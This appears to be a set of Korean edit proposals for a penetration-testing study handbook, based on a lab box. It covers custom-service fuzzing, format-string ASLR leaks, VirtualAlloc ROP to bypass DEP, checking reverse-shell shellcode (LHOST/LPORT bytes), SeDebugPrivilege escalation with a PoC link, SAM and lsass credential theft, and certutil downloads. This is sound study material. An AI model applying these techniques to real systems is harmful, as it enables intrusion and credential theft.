## 제안 1 — B-9(메모리 손상·바이너리 익스플로잇) 하위, 신규: 커스텀 네트워크 서비스 발견 절차

**①어느 절:** `## B. 기법 카드` → `### B-9. 메모리 손상 · 바이너리 익스플로잇` 하위. 신규 서브카드(번호는 관리자가 B-9X 로 배정).
**②신규.** B-9 기존 항목(B-91 SEH·B-92 에그헌터·B-93 badchar·B-94 가젯 출처)과 겹치지 않음 — 이건 "발견" 단계, 기존은 "익스플로잇 구성" 단계.
**③넣을 본문(원문 그대로, 개조식 종결만 다듬음):**

> **nmap이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보.** `fingerprint-strings`가 뜨면 그 자체가 신호.
>
> | 신호 | 결론 |
> |---|---|
> | 포트 VERSION 칸이 비어 있음 | nmap이 제품을 특정 못함 → 커스텀 구현 |
> | `1 service unrecognized despite returning data` + `SF-Port21-TCP:` 핑거프린트 덤프 | nmap DB에 없는 서비스 → `searchsploit` 무의미, 직접 프로토콜을 두드려야 함 |
> | 긴 입력에 연결이 끊기거나 서비스가 죽음 | 오버플로우 확정 신호 |
>
> "커스텀 서비스를 만났다" → 이 순서로 움직인다:
> 1. **명령 열거** — `nc`로 붙어 `HELP`, 문서에 없는 단어(`DEBUG`·`TEST`·`ADMIN`·`SITE`·`STAT`)를 찍어본다
>    ```bash
>    nc -nv <타겟> 21
>    USER anonymous
>    HELP            # 구현된 명령 목록이 나오면 즉시 공격면이 드러난다
>    SITE HELP
>    ```
> 2. **인증 경계 확인** — 취약 명령이 로그인 전/후 어디에 있는가. 기본 자격증명(`admin:admin`·`anonymous`) 시도
> 3. **각 명령에 긴 인자** — 100 → 500 → 1000 → 5000바이트. 서비스가 끊기는 명령이 오버플로우 후보
> 4. **각 명령에 포맷 지정자** — `%x|%x|%x` · `%s` · `%n`. `%x`가 값으로 치환되면 릭 확보
> 5. **바이너리 확보 시도** — SMB 공유·서비스 자체 다운로드 명령·웹. 로컬에 같은 서비스를 띄우면 디버깅이 100배 쉬움. FTP로 받을 때는 반드시 `binary` 모드 — ascii 모드는 조용히 깨짐(제안 6 참조)
> 6. **크래시 재현 → 오프셋 → 배드캐릭터 → 완화 기능 판정 → 가젯**
>
> **3번과 4번은 순서를 바꾸지 말 것.** 오버플로우로 서비스를 죽이면 포맷 스트링을 시험할 기회가 사라짐(자동 재시작 안 되면 리버트해야 함).
>
> **응답 코드의 차이가 명령 존재 여부를 알려준다.** `500 Unknown command`(없음) vs `501 Syntax error`(있지만 인자가 틀림) vs `530 Not logged in`(있지만 인증 필요). "에러가 났다 = 그 명령은 없다"가 아님 — 에러 코드를 구분하지 않으면 존재하는 명령을 스스로 지워버림. 같은 계열: [[Hawat]]의 "응답이 성공을 뜻하지 않는다".

**④지우기 전 원문(개작 전 노트, 2-11절 도입부·⑦·"커스텀 서비스를 만났다" 체크리스트에서 발췌):**
> "nmap이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보. fingerprint-strings가 뜨면 그 자체가 신호다"
> "1. 명령 열거 — nc로 붙어 HELP, 그리고 문서에 없는 단어를 찍어본다. DEBUG·TEST·ADMIN·SITE·STAT / 2. 인증 경계 확인 — 취약 명령이 로그인 전/후 어디에 있는가 ... / 3번과 4번은 순서를 바꾸지 마라. 오버플로우로 서비스를 죽여버리면 포맷 스트링을 시험할 기회가 사라진다"
> "응답 코드의 차이가 명령 존재 여부를 알려준다 ... '에러가 났다 = 그 명령은 없다'가 아니다"

## 제안 2 — B-9 하위, 신규: 포맷 스트링 릭으로 ASLR 우회 + 64KB 할당 단위 베이스 역산

**①어느 절:** B-9 하위 신규 서브카드.
**②신규.**
**③넣을 본문:**

> **릭 값에서 진짜 스택 구간과 자기 출력 버퍼 구간을 구분할 것.** `%x` 반복 릭에서 인덱스가 올라갈수록 값이 ASCII 범위(0x20~0x7E)에 몰리기 시작하면 그 지점부터는 포맷 문자열 프레임이 아니라 **응답 버퍼 자신을 재귀적으로 읽고 있는 것**임(리틀엔디언으로 되돌리면 응답 문자열 자체가 나옴). 그 앞 4~5개 값만 유효한 포인터.
>
> **베이스 역산 검산법 — Windows PE는 4KB 페이지가 아니라 64KB 할당 단위 경계에 로드된다.** 계산된 베이스의 하위 16비트가 `0000` 이 아니면 릭 인덱스를 잘못 잡은 것. `leak - RVA = base` 꼴이고, RVA 는 그 바이너리를 실제로 실행/디버깅해봐야 나오는 상수(정적 분석만으로는 안 나옴).
>
> 릭 값 검증 체크리스트 — 익스플로잇을 짜기 전에 통과시킬 것:
> 1. 하위 16비트가 0인가? (`0x____0000`)
> 2. 값이 ASCII로 보이지 않는가?
> 3. 여러 번 실행해도 베이스가 32비트 사용자 공간(`0x00010000`~`0x7FFEFFFF`) 안인가?
> 4. 오프셋 상수가 매 실행 일정한가? 일정하지 않으면 인덱스를 잘못 잡은 것
>
> **릭 인덱스를 잘못 잡으면 증상이 고약하다** — 베이스가 매핑 안 된 주소가 돼 ROP 가젯 전부가 즉시 액세스 위반. "오프셋이 틀렸나" "배드캐릭터인가"를 먼저 의심하게 돼 진짜 원인(릭 인덱스)에 늦게 도달함.

**④지우기 전 원문:**
> "인덱스 5부터는 자기 자신의 출력 버퍼를 읽고 있다 ... 실전 의미: 릭 값이 갑자기 ASCII처럼 보이는 지점이 '쓸모 있는 스택'의 끝이다"
> "Windows PE 이미지는 4KB 페이지가 아니라 64KB 할당 단위(allocation granularity) 경계에 매핑된다. 따라서 이미지 베이스는 하위 16비트가 항상 0이다"
> "릭 값 검증 체크리스트 — 익스플로잇을 짜기 전에 통과시켜라 > 1. 하위 16비트가 0인가? ... 4. 오프셋 상수(여기선 0x10f0)가 매 실행 일정한가?"
> "증상이 고약한 이유: '오프셋이 틀렸나' '배드캐릭터인가' '가젯이 잘못됐나'를 먼저 의심하게 되어 진짜 원인(릭 인덱스)에 도달하기까지 오래 걸린다"

## 제안 3 — B-9 하위, 신규: VirtualAlloc ROP — PUSHAD 트릭으로 DEP 우회

**①어느 절:** B-9 하위 신규 서브카드.
**②신규.** 기존 B-91(SEH)·B-92(에그헌터)와 다른 서브토픽(DEP 우회, 반환주소 직접 덮어쓰기형).
**③넣을 본문:**

> **DEP(NX) 우회 표준형 — mona.py `!mona rop -m <module>` 이 생성하는 `VirtualAlloc` ROP 체인은 `PUSHAD` 한 번으로 호출 프레임을 조립한다.**
> `PUSHAD`는 EAX→ECX→EDX→EBX→ESP→EBP→ESI→EDI 순으로 푸시 — 미리 레지스터를 `VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)` 인자 값으로 채워두면 `PUSHAD` 직후 스택이 그대로 호출 프레임이 됨.
> 흐름: POP 가젯들로 레지스터 채움 → `PUSHAD#RETN` → `RETN`이 EDI(=RETN가젯)로 → 한 번 더 `RETN`이 ESI(=`JMP [EAX]`)로 → `VirtualAlloc` 진입(EAX=함수 포인터) → stdcall이라 자기 인자 정리하며 EBP값(=`POP EBP#RETN`)으로 반환 → 남은 EAX 슬롯 4바이트를 그 POP이 삼킴 → `RETN`이 체인 마지막 `JMP ESP`로 → ESP는 이제 NOP+셸코드.
>
> **mona가 생성한 주석을 믿지 말고 API 원형과 대조할 것.** `# EDX = 0x1000 (size)` 는 흔한 오기 — `0x1000`은 크기가 아니라 `MEM_COMMIT` 플래그이고 크기 인자는 `EBX`. 값 배치 자체가 틀린 건 아니라 익스플로잇은 그대로 동작하지만, **값을 손으로 바꿔야 할 때 주석만 보고 고치면 깨진다.**
>
> **NOP 슬레드는 관례지 항상 필수는 아니다.** `VirtualAlloc`이 stdcall로 인자를 스스로 정리하고 `POP EBP`가 남은 슬롯을 삼키는 체인이면 `JMP ESP` 착지점이 결정론적이라 NOP이 없어도 동작할 수 있음. 그래도 총 길이가 고정된 페이로드가 아니면 넣는 게 공짜에 가까운 보험임.
>
> ASLR/DEP 조합별 필요 작업량:
> | ASLR | DEP | 필요한 것 | 난이도 |
> |---|---|---|---|
> | ✗ | ✗ | `EIP = JMP ESP` (교과서형) | 낮음 |
> | ✗ | ✓ | 고정 주소 ROP 체인(릭 불필요) | 중간 |
> | ✓ | ✗ | 릭으로 베이스 확보 후 `JMP ESP` 계산, ROP 불필요 | 중간 |
> | ✓ | ✓ | 릭 + ROP(이 경우) | 높음 |
>
> `!mona modules` 로 비-ASLR 모듈이 하나라도 있으면 그 안의 가젯은 주소 고정 — 릭 자체가 불필요해짐.

**④지우기 전 원문:** 2-8절 전체(ROP 실행 흐름 표·PUSHAD 설명), "주석의 `# EDX = 0x1000 (size)`는 틀린 주석이다" 절, 2-11절 판단 트리 표, ⑤절(NOP 슬레드 결정론 분석).

## 제안 4 — B-9 하위, 신규: msfvenom 셸코드를 붙이기 전 눈으로 검증 + badchar 는 "구조 증거"로 읽는다

**①어느 절:** B-9 하위 신규 서브카드. (badchar 판정 기준 자체는 기존 B-93과 인접 주제이나, B-93은 "헤더 위치에 따른 금지 바이트 표"이고 이건 "생성된 바이트에서 LHOST/LPORT를 눈으로 읽는 법 + 배드캐릭터 통과가 파서 구조의 증거가 되는 사례"라 별개로 제안.)
**②신규.**
**③넣을 본문:**

> **셸코드를 붙이기 전에 30초 눈으로 검증할 것** — 생성된 바이트 안에 LHOST/LPORT/실행 프로그램명이 그대로 보인다.
> | 바이트 패턴 | 의미 |
> |---|---|
> | `\x68\xc0\xa8\x2d\xcf` | `push 0xcf2da8c0` → 리틀엔디언 `c0 a8 2d cf` = 192.168.45.207(LHOST) |
> | `\x68\x02\x00\x01\xbb` | `push` sockaddr → `0x0002`=AF_INET, `0x01bb`=443(LPORT) |
> | `\x68\x63\x6d\x64\x00` | `push "cmd\0"` → 순수 cmd 셸(meterpreter 아님) 확정 |
> 오타 하나로 몇 시간이 날아가는 지점이 여기다. `msfvenom ... -f raw | xxd | grep -i c0a8` 로 빠르게 대조 가능.
>
> **"배드캐릭터를 확인 안 했다"가 항상 "운이 좋았다"는 아니다.** FTP 같은 줄 기반 텍스트 프로토콜이면 `\x00\x0a\x0d` 가 거의 확실히 문제될 것이라는 통념이 있으나, **파서가 문자열 함수(`strcpy` 류)가 아니라 길이 기반(`recv` 가 돌려준 길이만큼 `memcpy`)이면 널도 그대로 통과한다.** 널이 잘리지 않고 전달됐다는 관측 자체가 "이 파서는 길이 기반이다"의 증거가 됨 — 반대로 셸코드가 리스너에 붙었다 즉시 끊기면 문자열 기반 파서(중간에서 잘림)를 의심할 것. **그래도 `-b '\x00\x0a\x0d'` 는 습관으로 넣을 것** — 파서 종류는 덤프를 보기 전엔 알 수 없고 넣어서 손해는 없음.
>
> 실전 절차(배드캐릭터를 모를 때): `"\x01\x02...\xff"` 전체를 보내고 디버거 메모리에서 끊기거나 변형된 바이트를 찾아 제거 목록을 만든 뒤 `msfvenom ... -b '\x00\x0a\x0d' -f py -v sc`.

**④지우기 전 원문:** 2-9절 "왜 이 셸코드인가" 표 + "셸코드를 눈으로 검증하는 법" 콜아웃 + "배드캐릭터를 확인하지 않았다 — 다만 '운이 좋았던 것'은 아니다" 콜아웃 전문(⑥ 항목과 중복 통합).

## 제안 5 — B-4(윈도우 권한상승) 하위, 신규: SeDebugPrivilege — winlogon 핸들 탈취로 SYSTEM 프로세스 생성

**①어느 절:** `### B-4. 윈도우 권한상승` 하위. 기존 B-41(AlwaysInstallElevated)·B-42(FullPowers)·B-43(Sticky Notes)과 나란히 신규 서브카드.
**②신규.**
**③넣을 본문:**

> **`whoami /priv` 에 `SeDebugPrivilege: Enabled` 가 있으면 그 자체로 SYSTEM 상승 경로다.** `State: Disabled` 는 "쓸 수 없다"가 아니라 "토큰에 존재하되 비활성" — `AdjustTokenPrivileges` 로 스스로 켤 수 있음. 목록에 이름이 있으면 사용 가능하다고 볼 것. 진짜 없는 권한은 행 자체가 없음(예: `SeImpersonatePrivilege` 부재 → Potato 계열 전면 배제).
>
> **메커니즘** — `SeDebugPrivilege` 는 `OpenProcess` 호출 시 대상 프로세스의 DACL 검사를 통째로 우회하도록 설계됨(디버거가 임의 프로세스에 붙을 수 있어야 하므로). 절차:
> 1. SYSTEM 무결성으로 도는 프로세스(주로 `winlogon.exe` — 항상 존재, 세션 1, `lsass.exe` 와 달리 PPL 보호 없음) PID 탐색
> 2. `OpenProcess(PROCESS_ALL_ACCESS)` — 권한 덕분에 DACL 무시하고 성공
> 3. 그 핸들을 `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` 로 넘겨 `CreateProcess` 호출
> 4. 새 프로세스가 대상의 자식이 되며 부모(SYSTEM) 토큰을 상속
>
> PoC: <https://github.com/r4j3sh-com/SeDebugPrivilegePoC> — 사용법: `.\PoC.exe "<절대경로> <인자>"` **전체를 큰따옴표 하나로 감쌀 것**(안 감싸면 PoC가 첫 토큰만 명령으로 받음). **절대 경로 필수** — 새 프로세스는 winlogon 자식이라 작업 디렉터리가 우리 셸과 다를 수 있음.
>
> **위험한 Windows 권한 5종 반사표:**
> | 권한 | 공격 |
> |---|---|
> | `SeImpersonate`/`SeAssignPrimaryToken` | PrintSpoofer·RoguePotato·GodPotato |
> | `SeDebug` | SYSTEM 프로세스 핸들 탈취(이 카드) 또는 lsass 덤프 |
> | `SeBackup`/`SeRestore` | `reg save hklm\sam`+`hklm\system` → 로컬 해시 추출 → PtH |
> | `SeLoadDriver` | 취약 서명 드라이버 로드 → 커널 코드 실행(BSOD 위험) |

## 제안 6 — A(증상별), 신규: FTP `ascii` 모드로 바이너리를 받으면 조용히 깨진다 — 단 CRLF 손실만으로는 설명 안 되는 규모일 수 있다

**①어느 절:** `## A. 증상별 — 막혔을 때` 신규.
**②신규.**
**③넣을 본문:**

> **증상: 파일 전송이 "성공"으로 끝났는데 실행이 안 되거나 디스어셈블이 이상하다.** FTP 클라이언트의 기본 전송 모드는 `ascii` — 줄바꿈을 플랫폼 규약에 맞게 변환하므로 바이너리 안의 `0x0d`/`0x0a` 가 데이터가 아니라 개행으로 처리돼 소실됨.
> ```bash
> ftp <타겟>
> ftp> binary            # 이 한 줄. 별칭 bin / type image
> ftp> get <파일>
> ftp> bye
> ls -l <파일>            # 크기를 서버가 알려준 크기와 대조
> ```
> **증상이 고약한 이유** — 파일은 생기고 `file` 은 여전히 `PE32 executable` 이라 답함. 디버거에 올려서 디스어셈블이 이상하거나 섹션 오프셋이 안 맞을 때에야 알아챔.
>
> ⚠️ **[[Osaka]] 재검증(2026-08-26) — 손상 규모가 CRLF 변환 손실만으로는 설명되지 않았다.** 회수된 `ftp.exe` 는 55,971바이트인데 PE 섹션 테이블이 요구하는 크기는 158,208바이트 — **35%만 남아 전체의 65%가 빔.** DOS 스텁에서 CR 1바이트가 빠져 `PE\0\0` 시그니처가 `e_lfanew` 지정 위치(`0x100`)보다 1바이트 앞(`0xff`)에서 시작하는 것은 CRLF-변환형 손상과 일치하지만, 이 정도 규모(102KB)는 순수 CRLF 스트리핑으로는 나올 수 없는 양임(같은 밀도로 계속됐다면 전송된 바이트의 절반 이상이 `\r`/`\n` 이어야 하는데 x86 기계어에서는 불가능한 비율). **더 유력한 설명은 전송이 중간에 끊긴 것(부분 전송)** — 원인(네트워크 드롭·`ascii` 모드로 인한 조기 종료·수동 중단)은 산출물로 확정 불가.
> **일반화: 크기 불일치를 보면 "CRLF 몇 바이트 손실"과 "전송이 통째로 끊김"을 구분해서 진단할 것.** 예상 크기 대비 실제 크기 비율이 90% 이상이면 CRLF형, 그 아래로 크게 떨어지면 truncation 형 — 후자는 `binary` 모드를 켜도 재현될 수 있으므로 재전송 후 반드시 바이트 수를 다시 대조할 것.
>
> **같은 규칙이 다른 도구에도 적용된다 — 전송 성공 판정은 종료 코드가 아니라 크기·해시로 한다.** `certutil`(404 응답 본문을 파일로 저장, 아래) · `wget`(에러 페이지 저장) · `curl -O`(에러 본문 저장) · `scp`(부분 전송) 전부 같은 함정.

**④지우기 전 원문(개작 전 노트 ⑪절 전문, 손실 규모 재검증 문장 제외 나머지는 그대로):**
> "⑦에서 확인했듯 DEBUG는 타겟 바이너리를 내려받아 찾았다. 그런데 Kali에 남은 ~/PG/Osaka/ftp.exe는 55,971바이트인 반면, 그 파일의 PE 헤더가 요구하는 크기는 약 158,208바이트다. 전송이 중간에 끊긴 것이 아니라 받는 도중에 바이트가 군데군데 소실됐다."
> "결정적 증거는 DOS 스텁이다. 정상 PE라면 \r\r\n이 있어야 할 자리에서 \r 하나가 사라져 이후 전체가 앞으로 밀렸고, 그래서 PE\0\0 시그니처가 0x100이 아니라 0xff에 있다. 소실은 누적된다 — 0x4d5에서 1바이트, 0x11fd에서 2바이트, 0x3a5e에서 9바이트, 0xd537에서 14바이트."
> "원인: FTP 클라이언트의 기본 전송 모드가 ascii다."
> ⚠️ **위 "전송이 중간에 끊긴 것이 아니라"는 노트 원문의 단정이었으나, 이번 개작에서 PE 섹션 테이블을 직접 파싱해 원본 크기(158,208바이트, 정확히 일치)와 실제 크기(55,971바이트, 35%)를 재계산한 결과 이 단정은 근거가 약하다고 판단해 위 본문처럼 수정했다.** (검증 방법: `~/PG/Osaka/ftp.exe` 를 Kali에서 직접 파이썬으로 파싱 — PE 헤더 손상은 재확인, 크기 계산도 재확인, "중간에 끊긴 것이 아니다"라는 해석만 반증)

## 제안 8 — A, 신규: `certutil -urlcache -split` 은 404 여도 응답 본문을 파일로 남긴다

## 제안 9 — A, 신규: pwntools `recvuntil` 뒤 잔여 개행 — `recvlines(numlines=N)` 인덱스가 하나씩 밀린다

**①어느 절:** `## A. 증상별` 신규.
**②신규.**
**③넣을 본문:**

> **증상: `recvuntil(b"230 Login successful")` 다음 `recvlines()` 로 응답을 파싱하는데 값이 하나씩 밀려 있거나 `ValueError`/빈 값이 난다.** `recvuntil` 은 지정한 바이트열까지만 소비하고 뒤따르는 개행은 버퍼에 남김 — 다음 `recvlines(numlines=N)` 의 첫 줄은 그 잔여 개행이고 진짜 응답은 그 다음 줄부터.
> [[Osaka]] 는 `p.recvlines(numlines=2)[-1][6:]` 로 우회(2줄 받아 마지막 것만 사용). **더 근본적인 해법 — `recvuntil` 인자에 개행까지 포함시킬 것:**
> ```python
> p.recvuntil(b"230 Login successful\r\n")   # 종결자까지 명시적으로 소비
> p.sendline(b"DEBUG " + b"%x|" * 100)
> leak = p.recvline().strip()[6:]            # recvline() 한 번이면 충분해짐
> ```
> 디버깅용으로는 `remote(..., level='debug')` 가 송수신 전량을 로그로 찍어주므로, 파싱이 이상하면 먼저 그 로그에서 실제 바이트를 확인할 것.

**④지우기 전 원문(개작 전 노트 6장 ④절 전문):**
> "recvuntil(b'230 Login successful')은 뒤따르는 \r\n을 버퍼에 남긴다. 그래서 다음 recvlines의 첫 줄은 그 잔여 개행이고 진짜 응답은 두 번째다."
> "numlines=1로 짰다면 leak는 빈 바이트열이 되고 int(b'', 16) → ValueError 로 죽는다."

## 제안 10 — D(시간 배분·손절 기준), 신규: 바이너리 익스플로잇 — EIP 제어까지 90분

## 제안 6 정정 — `file` 이 `PE32 executable` 이라 답한다는 전제는 이 박스에서 거짓

제안 6 본문의 「파일은 생기고 `file` 은 여전히 `PE32 executable` 이라 답함」은 **순수 truncation 형에만 성립**함. Osaka 실측:

```
$ file ~/PG/Osaka/ftp.exe
ftp.exe: MS-DOS executable, MZ for MS-DOS
```

`PE\0\0` 시그니처가 `e_lfanew` 가 가리키는 `0x100` 이 아니라 `0xff` 로 1바이트 밀려 있어 `file` 이 PE 파싱에 실패하고 DOS 스텁까지만 인식함. **일반화: `file` 이 `MS-DOS executable` 로 떨어지면 그 자체가 «헤더가 밀렸다» = CRLF 변환형 손상의 신호임.** 제안 6 본문에 이 분기를 반영할 것.

## 제안 11 — A(증상별), 신규: cmd.exe 셸에서 Linux 반사로 헛도는 것

**①어느 절:** `## A. 증상별` 신규. **②신규.**
**③넣을 본문:**

> **증상: Windows 셸을 잡았는데 `'x' is not recognized as an internal or external command` 가 반복됨.** Linux 반사로 치고 있다는 신호 — `ls` 하나로 끝나지 않고 `cat`·`grep`·`which`·`ifconfig`·`ps` 까지 연달아 헛돔.
>
> | Linux | cmd.exe | PowerShell |
> |---|---|---|
> | `ls` | `dir` | `Get-ChildItem` (`ls` 별칭 있음) |
> | `cat` | `type` | `Get-Content` |
> | `grep` | `findstr` | `Select-String` |
> | `which` | `where` | `Get-Command` |
> | `ifconfig` | `ipconfig` | `Get-NetIPAddress` |
> | `ps` | `tasklist` | `Get-Process` |
> | `find / -name x` | `where /R C:\ x` | `Get-ChildItem -Recurse -Filter x` |
> | `wget` | `certutil -urlcache -split -f` | `iwr -Uri ... -OutFile ...` |
>
> **cmd 셸을 잡았으면 즉시 PowerShell 로 갈아탈지 판단할 것** — `powershell -nop -ep bypass` 한 줄이면 오른쪽 칼럼을 전부 씀. 단 PowerShell 은 AMSI·스크립트 블록 로깅에 훨씬 잘 잡히므로 탐지를 신경 쓰는 상황이면 cmd 가 조용함.

**④지우기 전 원문(`.bak` 1084~1107행 `### ② ls를 쳤다 — Linux 반사`):**
> "사소해 보이지만 경고 신호다. Linux 반사로 치고 있다는 뜻이고, 같은 반사로 `cat`·`grep`·`which`·`ifconfig`를 치면 계속 헛돈다."
> (대응표 8행 원문 그대로 위에 옮김)
> "cmd 셸을 잡았으면 즉시 PowerShell로 갈아탈지 판단하라 … 단 PowerShell은 AMSI·스크립트 블록 로깅에 훨씬 잘 잡힌다."

⚠️ 원 캡처(`C:\Users\Wilson\Desktop>ls` → `'ls' is not recognized …`)는 **타겟 pty 연속 캡처의 일부**라 개작에서 잘려 나간 것을 노트 본문(`certutil` 펜스)에 복원했음. 여기 이관되는 것은 **표와 판단 기준**뿐.

## 제안 12 — B-9 하위, 신규: 셸코드 아키텍처(x86/x64)를 확정하지 않고 만들면 즉사한다

**①어느 절:** `### B-9. 메모리 손상 · 바이너리 익스플로잇` 하위 신규 서브카드. **②신규.**
**③넣을 본문:**

> **증상이 지독한 오류다 — 오프셋도 맞고 EIP 도 잡히는데 셸코드 진입 즉시 액세스 위반.** "배드캐릭터인가" "DEP 인가"를 의심하며 한참 팜.
>
> | 확인 방법 | 32비트 신호 | 64비트 신호 |
> |---|---|---|
> | 릭 값 자릿수 | 최대 8자리 (`0x012d10f0`) | 12자리 이상 (`0x7ff6a1b20000`) |
> | 크래시 시 레지스터 | `EIP`/`ESP` | `RIP`/`RSP` |
> | 타겟 파일 경로 | `C:\Program Files (x86)\` | `C:\Program Files\` |
> | `tasklist`(셸 확보 후) | — | 32비트 프로세스는 `*32` 표기 |
>
> **64비트 Windows 에서도 서비스는 32비트로 도는 경우가 많음.** OS 가 x64 라고 페이로드가 x64 인 것이 아님 — **판정 기준은 OS 가 아니라 그 프로세스**. [[Osaka]] 가 정확히 그 경우(OS 10.0.17763 x64, 취약 서비스 x86 → `msfvenom -a x86`, 가젯 `p32()` 팩).

**④지우기 전 원문(`.bak` 1200~1215행 `### ⑧ 32비트인지 64비트인지 확정하지 않고 셸코드를 만들면 즉사한다` 전문):**
> "이 박스는 `-a x86`이 정답이었다. 근거는 릭 값이 4바이트 폭(`0x012d10f0`)이고 ROP 가젯을 `p32()`로 팩했다는 것이다."
> "잘못 고르면 증상이 지독하다: 오프셋도 맞고 EIP도 잡히는데 셸코드 진입 즉시 액세스 위반이 난다."
> "OS가 Server 2019 x64라고 해서 페이로드가 x64인 것이 아니다. 판정 기준은 OS가 아니라 그 프로세스다."

## 제안 13 — B-9 하위, 신규: 원샷 익스플로잇 — 발사 전 체크리스트 (+ Windows 셸 첫 명령)

**①어느 절:** B-9 하위 신규 서브카드. **②신규.** 제안 10(손절선)이 «언제 포기하나»라면 이건 «던지기 직전에 무엇을 확인하나»로 별개.
**③넣을 본문:**

> **스택을 파괴하는 익스플로잇은 실패하면 프로세스를 크래시시킴.** 서비스가 자동 재시작되지 않으면 그 포트가 사라지고 그때부터는 리버트 말고 방법이 없음. 스크립트에 일시정지를 넣는 것이 실질적 방어:
> ```python
> print("Press any key to send")
> input()          # ← 이 사이에 리스너를 확인한다
> ```
>
> **던지기 직전 5항목 — 한 번 죽으면 되돌릴 수 없음:**
> 1. **리스너가 떠 있는가** — `ss -tlnp | grep 443` 로 눈으로 확인. 마음속으로 "띄웠지"는 안 됨
> 2. **셸코드의 LHOST 가 지금 VPN IP 와 같은가** — `ip a show tun0`. VPN 재접속으로 IP 가 바뀌는 것이 가장 흔한 사고
> 3. **포트가 리스너와 셸코드에서 일치하는가** — 셸코드는 443, 리스너는 4444 로 띄우는 실수
> 4. **`assert` 로 페이로드 총 길이를 검증했는가**
> 5. **릭 베이스가 `0x____0000` 인가**
>
> **셸이 붙은 «직후» 칠 명령 (Linux 의 `id; sudo -l` 에 해당):**
> ```cmd
> whoami
> whoami /priv                    :: ★ 권한 목록 — 여기서 끝나는 박스가 놀랄 만큼 많다
> whoami /groups
> hostname & ipconfig /all
> net user & net localgroup administrators
> systeminfo                      :: OS 빌드 + 핫픽스 → 커널 익스플로잇 판단
> ```

**④지우기 전 원문(`.bak` 1217~1235행 `### ⑨ 원샷 익스플로잇` 전문 + 769~778행 콜아웃 전문):**
> "스택을 파괴하는 익스플로잇은 실패 시 프로세스를 크래시시킨다. 서비스가 자동 재시작되지 않으면 21번 포트가 사라지고, 그때부터는 리버트 말고는 방법이 없다."
> "1. 리스너가 떠 있는가 … 2. 셸코드의 LHOST가 지금 VPN IP와 같은가 … 5. 베이스가 `0x____0000`인가"
> "5개를 통과하지 못한 채 던지는 것보다, 30초 더 확인하고 던지는 것이 압도적으로 싸다."
> "`whoami /priv`가 가장 먼저다. Linux의 `sudo -l`처럼 단 한 줄로 게임이 끝나는 경우가 많다."
